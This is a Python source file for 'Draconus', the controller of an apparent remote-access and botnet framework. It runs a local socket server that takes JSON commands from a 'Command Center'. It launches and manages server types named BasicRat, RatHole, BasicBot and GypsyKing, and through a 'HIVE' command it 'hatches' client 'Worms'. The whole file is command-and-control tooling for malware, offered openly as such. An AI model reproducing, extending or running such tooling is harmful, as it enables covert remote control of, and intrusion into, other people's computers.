import os
import socket
import sys
import json

from time import sleep
from multiprocessing import Pipe, Event

from app.CONFIG import SOCKETS_DIR, DRACO_OUT_MAIN_DIR, UNIX_SOCKET_FORMAT_CODE, UNIX_SOCKET_RAW_LEN
from app import Messenger, MrHeader, Queen, Importer
from app import Basic, Echo, BasicBot, BasicRat, GypsyKing, RatHole

class ServerHandler:
    def __init__(self, name, server, pipe, stop_signal, draco_callback):
        self.name = name
        self.server = server
        self.pipe = pipe
        self.Draco = draco_callback
        self.signal_stop = stop_signal
    
    def send_cmd(self, command):
        cmd = []
        for c in command.split(" "):
            if c == "" or c == " ":
                continue
            cmd.append(c)
        try:
            self.pipe.send(cmd)
        except Exception as e:
            self.Draco.Msg(f"[DRACONUS] [!!] ERROR Pipe recive from server [!!] : {e}")
    
    def recive(self):
        check = self.pipe.poll
        if not check:
            return None
        else:
            rec = self.pipe.recv()
            return rec
    
    def kill_me(self):
        self.signal_stop.set()
        self.Draco.Msg(f"\n[DRACONUS] [!!] Send Signal to stopping server: <{self.name}>")

    
    def begin(self):
        self.Draco.Msg(f"\n[DRACONUS] Server <{self.name}> create successfull. Addr: {self.server._ip} : {self.server._port}", level=True)
        self.server.start()




class Draconus:
    def __init__(self, conf={}):
        self.draco_out_dir = DRACO_OUT_MAIN_DIR
        self.sockets_dir = SOCKETS_DIR
        self.cleaner()
        self.format = UNIX_SOCKET_FORMAT_CODE
        self.raw_len = UNIX_SOCKET_RAW_LEN
        self._draco_sock = os.path.join(self.sockets_dir, "_draco_sock")
        self._msg_sock = os.path.join(self.sockets_dir, "_draco_msg")
        self._dev = conf.get("DEV", False)
        self._msg_no_prints = conf.get("MSG_NO_PRINT", False)
        self.Msg = Messenger("DRACONUS", {"DEV": self._dev, "MSG_NO_PRINT": self._msg_no_prints, "MSG-SOCKET": "_draco_msg"})
        self._sys_header = MrHeader()
        self.sys_msg = self._sys_header.header
        self.SERVERS = {}
        self.TYPES = {
            Echo.TYPES : Echo,
            BasicRat.TYPES : BasicRat,
            GypsyKing.TYPES : GypsyKing,
            BasicBot.TYPES : BasicBot,
            RatHole.TYPES : RatHole
        }
    
    def make_file(self):
        if not os.path.exists(self.draco_out_dir):
            os.mkdir(self.draco_out_dir)
        if not os.path.exists(self.sockets_dir):
            os.mkdir(self.sockets_dir)
        if os.path.exists(self._draco_sock):
            try:
                os.unlink(self._draco_sock)
            except Exception as e:
                self.Msg(f"[DRACONUS] ERROR: Delete socket file: {e}")
                return False
        return True
    
    def cleaner(self):
        if os.path.exists(self.sockets_dir):
            for f in os.listdir(self.sockets_dir):
                try:
                    os.unlink(os.path.join(self.sockets_dir, f))
                except:
                    pass
        
    
    def build_server(self):
        try:
            self.server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self.server.bind(self._draco_sock)
            self.server.listen(1)
            self.Msg("[DRACONUS] Local server build successfull", level=True)
            return True
        except Exception as e:
            self.Msg(f"[DRACONUS] ERROR: Build socket server {e}", level=True)
            return False
        
    def build(self):
        if not self.make_file() or not self.build_server():
            self.Msg(f"[DRACONUS] ERROR: Draconus Cant Start", level=True)
            sys.exit()
        self.Queen = Queen(self)
    
    def accept_conn(self):
        self.conn, self.addr = self.server.accept()
        self.Msg("[DRACONUS] Connected to Command Center", level=True)
    
    def recv_msg(self):
        msg = b""
        while True:
            recv = self.conn.recv(self.raw_len)
            if not recv or recv == b"":
                break
            else:
                if len(recv) < self.raw_len:
                    msg += recv
                    break
                else:
                    msg += recv
        return msg.decode(self.format)
    
    def recv_json(self):
        msg = self.recv_msg()
        if not msg:
            return None
        try:
            jmsg = json.loads(msg)
            return jmsg
        except json.JSONDecodeError as e:
            self.Msg(f"[DRACONUS] [!!] ERROR JSON data decode [!!] : {e}")
            return "{}"

    def send_msg2cc(self, msg):
        self.conn.sendall(msg.encode(self.format))
    
    #################################################################

    def exit_draconus(self):
        self.Msg("\n[DRACONUS] Prepare to stoping ...... wait moment", level=True)
        for s in self.SERVERS.values():
            s.kill_me()
        sleep(2)
        self.Msg("\n[!!] EXIT DRACONUS [!!]", level=True)
        sys.exit()
        

    def make_server(self, conf):
        self.Msg(f"\n[DRACONUS-DEV] Conf data: {conf}", dev=True)
        if not conf.get("SYS_MSG"):
                conf["SYS_MSG"] = self.sys_msg
        name = conf.get("NAME")
        port = conf.get("PORT")
        if not name or not port:
            self.Msg("[DRACONUS] [!!] ERROR [!!] Some config is missing")
            return None
        if name in self.SERVERS:
            self.Msg("[DRACONUS] [!!] ERROR: Server with this name exists [!!]", level=True)
            return None
        if not conf["TYPES"] in self.TYPES:
            self.Msg("[DRACONUS] [!!] ERROR: Unknown Server Type [!!]", level=True)
            return None
        too_serv, too_draco = Pipe()
        stop_signal = Event()
        new = self.TYPES[conf.get("TYPES")](too_serv, conf, stop_signal)
        self.SERVERS[name] = ServerHandler(name, new, too_draco, stop_signal, self)
        self.SERVERS[name].begin()
        if conf.get("START_NOW"):
            sleep(0.5)
            self.SERVERS[name].send_cmd("start")

    def check_server(self, name):
        serv = self.SERVERS.get(name)
        if serv:
            return serv
        else:
            self.Msg(f"\n[{self.name}] [!!] ERROR [!!] Server does not exist", level=True)
            return None

    def start_server(self, name):
        serv = self.check_server(name)
        if serv:
            serv.send_cmd("start")
    
    def stop_server(self, name):
        serv = self.check_server(name)
        if serv:
            serv.send_cmd("stop")
    
    def hatchering(self, name, conf):
        if not name in self.SERVERS.keys():
            self.Msg("\n[DRACONUS] [!!] ERROR Server does not exists [!!]", level=True)
            return False
        self.Queen.hatchering(conf)
    
    def show_config(self):
        for s in self.SERVERS.values():
            s.send_cmd("conf")
            sleep(0.2)
    
    def show_serv_types(self):
        _help = "\n[DRACONUS] ***** List of avaible server types ****\n*** Every Server works in background as long as Draconus works\n"
        _help += "*** Servers can make Worms (clients). Worms can made in 'hive'\n*** 'Child Worm' show what client can make do it"
        self.Msg(_help, level=True)
        buff = "\n[DRACONUS] ------------------------- SERVER TYPES -----------------------------------\n"
        for s in self.TYPES.values():
            buff += "--------------------------------------------------------------------------------------------\n"
            buff += f"--- Server Type:  {s.TYPES}\n"
            buff += f"--- Description:  {s.INFO}\n"
            buff += f"--- Child Worm:   {s.WORM_INFO}\n"
        buff += "--------------------------------------------------------------------------------------------\n"
        self.Msg(buff, level=True)
    
    def kill_server(self, name):
        serv = self.check_server(name)
        if serv:
            serv.kill_me()
            try:
                serv.server.terminate()
            except Exception as e:
                print("TERMINATE ERROR: ", e)
            del self.SERVERS[name]
            try:
                os.unlink(os.path.join(self.sockets_dir, name))
            except Exception as e:
                print("ERROR del socket: ", e)
            try:
                os.unlink(os.path.join(self.sockets_dir, f"{name}_api"))
            except Exception as e:
                print("ERROR del socket: ", e)
    


    
    ######################################################################

    def exec_command(self, cmd):
        if cmd[0] == "make":
            self.make_server(cmd[1])
        elif cmd[0] == "start":
            self.start_server(cmd[1])
        elif cmd[0] == "stop":
            self.stop_server(cmd[1])
        elif cmd[0] == "serv":
            self.SERVERS[cmd[1]].send_cmd(cmd[2])
        elif cmd[0] == "END":
            self.exit_draconus()
        elif cmd[0] == "HIVE":
            self.hatchering(cmd[1], cmd[2])
        elif cmd[0] == "show":
            self.show_config()
        elif cmd[0] == "types":
            self.show_serv_types()
        elif cmd[0] == "kill":
            self.kill_server(cmd[1])
        
        

    

    def begin(self):
        self.build()
        while True:
            self.accept_conn()
            while True:
                cmd = self.recv_json()
                self.Msg(f"\nCOMMAND From Command Center: {cmd}", dev=True)
                if not cmd or cmd == "":
                    break
                self.exec_command(cmd)

if __name__ == "__main__":
    DRACONUS = Draconus({"DEV" : False})
    DRACONUS.begin()
        
